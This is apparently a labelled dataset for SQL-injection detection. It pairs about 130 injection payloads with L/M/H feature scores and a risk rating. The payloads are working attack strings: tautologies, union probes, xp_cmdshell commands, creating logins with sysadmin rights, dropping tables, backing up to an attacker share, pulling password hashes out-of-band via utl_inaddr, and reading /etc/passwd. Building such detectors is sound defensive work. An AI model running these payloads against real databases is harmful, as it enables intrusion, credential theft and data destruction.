sqli	d_char	d_token	punck	s_token	space	length	alw_true	output
<>"'%;)(&+	M	L	M	L	L	L	L	L
'%20or%201=1	M	L	L	M	L	L	H	M
'sqlattempt1	L	L	L	L	L	L	L	L
%28	L	L	L	L	L	L	L	L
%29	L	L	L	L	L	L	L	L
%26	L	L	L	L	L	L	L	L
%21	L	L	L	L	L	L	L	L
' or ''='	M	L	L	L	L	L	H	M
' or 3=3	M	L	L	M	L	L	H	M
 or 3=3 --	L	L	L	M	M	L	H	M
'; exec master..xp_cmdshell 'ping 10.10.1.2'--	M	M	M	M	M	M	L	H
'create user name identified by 'pass123' --	M	L	M	M	M	M	L	H
'create user name identified by pass123 temporary tablespace temp default tablespace users; 	L	M	L	M	M	M	L	H
' ; drop table temp --	L	L	M	L	M	M	L	L
'exec sp_addlogin 'name' , 'password' --	M	L	M	L	M	M	L	H
' exec sp_addsrvrolemember 'name' , 'sysadmin' --	M	L	M	L	M	M	L	H
' insert into mysql.user (user, host, password) values ('name', 'localhost', password('pass123')) --	H	M	M	M	M	M	L	H
' grant connect to name; grant resource to name; --	L	L	M	L	M	M	L	L
' insert into users(login, password, level) values( char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72) + char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72),char(0x64)	L	H	H	H	H	H	L	H
' or 1=1 --	M	L	L	M	M	L	H	M
' union (select @@version) --	L	M	M	L	M	M	L	H
' union (select null, (select @@version)) --	L	M	M	L	M	M	L	H
' union (select null, null, (select @@version)) --	L	M	M	L	M	M	L	H
' union (select null, null, null,  (select @@version)) --	L	M	M	L	M	M	L	H
' union (select null, null, null, null,  (select @@version)) --	L	M	M	L	M	M	L	H
' union (select null, null, null, null,  null, (select @@version)) --	L	H	M	L	M	M	L	M
select @@version	L	L	L	L	L	L	L	L
select @@servernamee	L	L	L	L	L	L	L	L
select @@microsoftversione	L	M	L	L	L	M	L	L
select * from master..sysserverse	L	L	M	L	M	M	L	L
select * from sysusers	L	L	L	L	M	M	L	L
exec master..xp_cmdshell 'ipconfig+/all'	M	M	M	L	L	M	L	H
exec master..xp_cmdshell 'net+view'	M	M	M	L	L	M	L	H
exec master..xp_cmdshell 'net+users'	M	M	M	L	L	M	L	H
exec master..xp_cmdshell 'ping+<attackerip>'	M	M	M	L	L	M	L	H
backup database master to disks='\\<attackerip>\<attackerip>\backupdb.dat'	M	L	M	L	M	M	L	H
create table myfile (line varchar(8000))" bulk insert foo from 'c:\inetpub\wwwroot\auth.aspâ'" select * from myfile"--	M	M	M	M	M	M	L	H
1'1	L	L	L	M	L	L	L	L
1 exec sp_ (or exec xp_)	L	M	L	L	M	M	L	L
1 and 1=1	L	L	L	M	L	L	H	M
1' and 1=(select count(*) from tablenames); --	M	M	M	M	M	M	L	H
1 or 1=1	L	L	L	M	L	L	H	M
1' or '1'='1	M	L	L	M	L	L	H	M
create table myfile (input text); load data infile '<filepath>' into table myfile; select * from myfile;	M	M	M	M	M	M	L	H
or 1=1--	L	L	L	M	L	L	H	M
'or '' = '	M	L	L	L	M	L	H	M
'--	L	L	L	L	L	L	L	L
' union select 1, '<user-fieldname>', '<pass-fieldname>' 1--	M	M	M	M	M	M	L	H
'or 1=1--	M	L	L	M	L	L	H	M
’ or ‘1’=’1	L	L	L	L	L	L	H	M
' or '1'='1	M	L	L	M	L	L	H	M
'||utl_http.request('http://192.168.1.1/')||'	M	L	M	M	L	M	L	H
' || myappadmin.adduser('admin', 'newpass') || '	H	L	M	L	M	M	L	M
' and 1=utl_inaddr.get_host_address((select banner from v$version where rownum=1)) and 'i'='i	H	M	M	M	M	M	H	H
' and 1=utl_inaddr.get_host_address((select sys.login_user from dual)) and 'i'='i	M	M	M	M	M	M	H	H
' and 1=utl_inaddr.get_host_address((select sys.database_name from dual)) and 'i'='i	M	M	M	M	M	M	H	H
' and 1=utl_inaddr.get_host_address((select host_name from v$instance)) and 'i'='i	M	M	M	M	M	M	H	H
' and 1=utl_inaddr.get_host_address((select global_name from global_name)) and 'i'='i	M	M	M	M	M	M	H	H
' and 1=utl_inaddr.get_host_address((select count(distinct(username)) from sys.all_users)) and 'i'='i	M	M	M	M	M	M	H	H
' and 1=utl_inaddr.get_host_address((select count(distinct(password)) from sys.user$)) and 'i'='i	M	M	M	M	M	M	H	H
' and 1=utl_inaddr.get_host_address((select count(distinct(table_name)) from sys.all_tables)) and 'i'='i	M	M	M	M	M	M	H	H
' and 1=utl_inaddr.get_host_address((select count(distinct(column_name)) from sys.all_tab_columns)) and 'i'='i	M	M	M	M	M	M	H	H
' and 1=utl_inaddr.get_host_address((select count(distinct(granted_role)) from dba_role_privs where grantee=sys.login_user)) and 'i'='i	H	M	M	M	M	H	H	H
' and 1=utl_inaddr.get_host_address((select distinct(username) from (select distinct(username), rownum as limit from sys.all_users) where limit=1)) and 'i'='i	H	H	M	M	M	H	H	H
' and 1=utl_inaddr.get_host_address((select distinct(password) from (select distinct(password), rownum as limit from sys.user$) where limit=1)) and 'i'='i	H	H	M	M	M	H	H	H
' and 1=utl_inaddr.get_host_address((select distinct(table_name) from (select distinct(table_name), rownum as limit from sys.all_tables) where limit=1)) and 'i'='i	H	H	M	M	M	H	H	H
' and 1=utl_inaddr.get_host_address((select distinct(column_name) from (select distinct(column_name), rownum as limit from all_tab_columns) where limit=1)) and 'i'='i	H	H	M	M	M	H	H	H
' and 1=utl_inaddr.get_host_address((select distinct(granted_role) from (select distinct(granted_role), rownum as limit from dba_role_privs where grantee=sys.loginuser) where limit=1)) and 'i'='i	H	H	M	H	H	H	H	H
' and 1=utl_inaddr.get_host_address((select distinct(username) from (select distinct(username), rownum as limit from sys.all_users) where limit=2)) and 'i'='i	H	H	M	M	M	H	H	H
' and 1=utl_inaddr.get_host_address((select distinct(password) from (select distinct(password), rownum as limit from sys.user$) where limit=2)) and 'i'='i	H	H	M	M	M	H	H	H
' and 1=utl_inaddr.get_host_address((select distinct(table_name) from (select distinct(table_name), rownum as limit from sys.all_tables) where limit=2)) and 'i'='i	H	H	M	M	M	H	H	H
' and 1=utl_inaddr.get_host_address((select distinct(column_name) from (select distinct(column_name), rownum as limit from all_tab_columns) where limit=2)) and 'i'='i	H	H	M	M	M	H	H	H
' and 1=utl_inaddr.get_host_address((select distinct(granted_role) from (select distinct(granted_role), rownum as limit from dba_role_privs where grantee=sys.loginuser) where limit=2)) and 'i'='i	H	H	M	H	H	H	H	H
' and 1=utl_inaddr.get_host_address((select distinct(username) from (select distinct(username), rownum as limit from sys.all_users) where limit=3)) and 'i'='i	H	H	M	M	M	H	H	H
' and 1=utl_inaddr.get_host_address((select distinct(password) from (select distinct(password), rownum as limit from sys.user$) where limit=3)) and 'i'='i	H	H	M	M	M	H	H	H
' and 1=utl_inaddr.get_host_address((select distinct(table_name) from (select distinct(table_name), rownum as limit from sys.all_tables) where limit=3)) and 'i'='i	H	H	M	M	M	H	H	H
' and 1=utl_inaddr.get_host_address((select distinct(column_name) from (select distinct(column_name), rownum as limit from all_tab_columns) where limit=3)) and 'i'='i	H	H	M	M	M	H	H	H
' and 1=utl_inaddr.get_host_address((select distinct(granted_role) from (select distinct(granted_role), rownum as limit from dba_role_privs where grantee=sys.loginuser) where limit=3)) and 'i'='i	H	H	M	H	H	H	H	H
' and 1=utl_inaddr.get_host_address((select distinct(username) from (select distinct(username), rownum as limit from sys.all_users) where limit=4)) and 'i'='i	H	H	M	M	M	H	H	H
' and 1=utl_inaddr.get_host_address((select distinct(password) from (select distinct(password), rownum as limit from sys.user$) where limit=4)) and 'i'='i	H	H	M	M	M	H	H	H
' and 1=utl_inaddr.get_host_address((select distinct(table_name) from (select distinct(table_name), rownum as limit from sys.all_tables) where limit=4)) and 'i'='i	H	H	M	M	M	H	H	H
' and 1=utl_inaddr.get_host_address((select distinct(column_name) from (select distinct(column_name), rownum as limit from all_tab_columns) where limit=4)) and 'i'='i	H	H	M	M	M	H	H	H
' and 1=utl_inaddr.get_host_address((select distinct(granted_role) from (select distinct(granted_role), rownum as limit from dba_role_privs where grantee=sys.loginuser) where limit=4)) and 'i'='i	H	H	M	H	H	H	H	H
' and 1=utl_inaddr.get_host_address((select distinct(username) from (select distinct(username), rownum as limit from sys.all_users) where limit=5)) and 'i'='i	H	H	M	M	M	H	H	H
' and 1=utl_inaddr.get_host_address((select distinct(password) from (select distinct(password), rownum as limit from sys.user$) where limit=5)) and 'i'='i	H	H	M	M	M	H	H	H
' and 1=utl_inaddr.get_host_address((select distinct(table_name) from (select distinct(table_name), rownum as limit from sys.all_tables) where limit=5)) and 'i'='i	H	H	M	M	M	H	H	H
' and 1=utl_inaddr.get_host_address((select distinct(column_name) from (select distinct(column_name), rownum as limit from all_tab_columns) where limit=5)) and 'i'='i	H	H	M	M	M	H	H	H
' and 1=utl_inaddr.get_host_address((select distinct(granted_role) from (select distinct(granted_role), rownum as limit from dba_role_privs where grantee=sys.loginuser) where limit=5)) and 'i'='i	H	H	M	H	H	H	H	H
' and 1=utl_inaddr.get_host_address((select distinct(username) from (select distinct(username), rownum as limit from sys.all_users) where limit=6)) and 'i'='i	H	H	M	M	M	H	H	H
' and 1=utl_inaddr.get_host_address((select distinct(password) from (select distinct(password), rownum as limit from sys.user$) where limit=6)) and 'i'='i	H	H	M	M	M	H	H	H
' and 1=utl_inaddr.get_host_address((select distinct(table_name) from (select distinct(table_name), rownum as limit from sys.all_tables) where limit=6)) and 'i'='i	H	H	M	M	M	H	H	H
' and 1=utl_inaddr.get_host_address((select distinct(column_name) from (select distinct(column_name), rownum as limit from all_tab_columns) where limit=6)) and 'i'='i	H	H	M	M	M	H	H	H
' and 1=utl_inaddr.get_host_address((select distinct(granted_role) from (select distinct(granted_role), rownum as limit from dba_role_privs where grantee=sys.loginuser) where limit=6)) and 'i'='i	H	H	M	H	H	H	H	H
' and 1=utl_inaddr.get_host_address((select distinct(username) from (select distinct(username), rownum as limit from sys.all_users) where limit=7)) and 'i'='i	H	H	M	M	M	H	H	H
' and 1=utl_inaddr.get_host_address((select distinct(password) from (select distinct(password), rownum as limit from sys.user$) where limit=7)) and 'i'='i	H	H	M	M	M	H	H	H
' and 1=utl_inaddr.get_host_address((select distinct(table_name) from (select distinct(table_name), rownum as limit from sys.all_tables) where limit=7)) and 'i'='i	H	H	M	M	M	H	H	H
' and 1=utl_inaddr.get_host_address((select distinct(column_name) from (select distinct(column_name), rownum as limit from all_tab_columns) where limit=7)) and 'i'='i	H	H	M	M	M	H	H	H
' and 1=utl_inaddr.get_host_address((select distinct(granted_role) from (select distinct(granted_role), rownum as limit from dba_role_privs where grantee=sys.loginuser) where limit=7)) and 'i'='i	H	H	M	H	H	H	H	H
' and 1=utl_inaddr.get_host_address((select distinct(username) from (select distinct(username), rownum as limit from sys.all_users) where limit=8)) and 'i'='i	H	H	M	M	M	H	H	H
' and 1=utl_inaddr.get_host_address((select distinct(password) from (select distinct(password), rownum as limit from sys.user$) where limit=8)) and 'i'='i	H	H	M	M	M	H	H	H
' and 1=utl_inaddr.get_host_address((select distinct(table_name) from (select distinct(table_name), rownum as limit from sys.all_tables) where limit=8)) and 'i'='i	H	H	M	M	M	H	H	H
' and 1=utl_inaddr.get_host_address((select distinct(column_name) from (select distinct(column_name), rownum as limit from all_tab_columns) where limit=8)) and 'i'='i	H	H	M	M	M	H	H	H
' and 1=utl_inaddr.get_host_address((select distinct(granted_role) from (select distinct(granted_role), rownum as limit from dba_role_privs where grantee=sys.loginuser) where limit=8)) and 'i'='i	H	H	M	H	H	H	H	H
select version();	L	L	M	L	L	L	L	L
select current_database();	L	L	M	L	L	M	L	L
select current_user;	L	M	L	L	L	L	L	L
select session_user;	L	M	L	L	L	L	L	L
select current_setting('log_connections');	M	M	M	L	L	M	L	H
select current_setting('log_statement');	M	M	M	L	L	M	L	H
select current_setting('port');	M	M	M	L	L	M	L	H
select current_setting('password_encryption');	M	M	M	L	L	M	L	H
select current_setting('krb_server_keyfile');	M	M	M	L	L	M	L	H
select current_setting('virtual_host');	M	M	M	L	L	M	L	H
select current_setting('port');	M	M	M	L	L	M	L	H
select current_setting('config_file');	M	M	M	L	L	M	L	H
select current_setting('hba_file');	M	M	M	L	L	M	L	H
select current_setting('data_directory');	M	M	M	L	L	M	L	H
select * from pg_shadow;	L	M	L	L	M	M	L	L
select * from pg_group;	L	M	L	L	M	M	L	L
create table myfile (input text);	L	L	M	L	M	M	L	L
copy myfile from '/etc/passwd'; 	M	L	L	M	M	M	L	H
select * from myfile;copy myfile to /tmp/test;	L	L	M	M	M	M	L	H
sleep(1) /*‘ or sleep(1) or ‘“ or sleep(1) or “*/	M	M	M	M	M	M	L	H
sleep(1) /*' or sleep(1) or '" or sleep(1) or "*/	M	M	M	M	M	M	L	H
